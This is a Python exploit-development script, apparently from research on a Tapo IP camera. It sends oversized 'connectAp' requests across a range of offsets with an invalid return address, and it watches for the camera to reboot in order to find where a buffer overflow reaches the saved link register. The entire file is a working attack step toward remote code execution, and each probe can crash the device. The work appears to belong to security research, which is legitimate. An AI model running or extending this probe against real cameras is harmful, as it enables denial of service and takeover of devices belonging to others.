#!/usr/bin/env python3
"""Bare-offset positive-control probe: fire a payload with an unmapped target at every offset.

Any hit reboots the camera (unmistakable) and proves the write reaches the saved lr, which fixes
the offset and leaves only the address unknown. Until a hit exists, nothing has been proven about
the primitive.  usage: bare_offset_probe.py <ip> [start] [end] [step]"""
import sys, time, socket
sys.path.insert(0,'deliverables/scripts')
import tapo_connectap_sc as T
HOST=sys.argv[1] if len(sys.argv)>1 else '192.168.4.243'
START=int(sys.argv[2]) if len(sys.argv)>2 else 1024
END=int(sys.argv[3]) if len(sys.argv)>3 else 8192
STEP=int(sys.argv[4]) if len(sys.argv)>4 else 4
def up():
    r=T.post(HOST,"/",{"method":"login","params":{"cnonce":"","encrypt_type":"3","username":"admin"}},timeout=3)
    return bool(r.strip())
for off in range(START, END, STEP):
    try:
        s=T.login(HOST, tries=15)
    except SystemExit:
        continue
    b=T.build(off, None, 0xffffffff, sled=0, padpc=1, prefix=b"", bare=True, hang=False)
    try:
        r=T.req(HOST, s, {"method":"connectAp","params":T.connect_params(b,"Aardvark","00:00:00:00:00:00")}, timeout=6)
    except SystemExit:
        continue
    print(f"{time.strftime('%H:%M:%S')} off={off} {str(r)[:60]}", flush=True)
    # a reboot shows as the next few probes failing
    fails=sum(0 if up() else 1 for _ in range(3))
    if fails==3:
        print(f"REBOOT? after off={off}", flush=True)
        time.sleep(5)
print("done", flush=True)
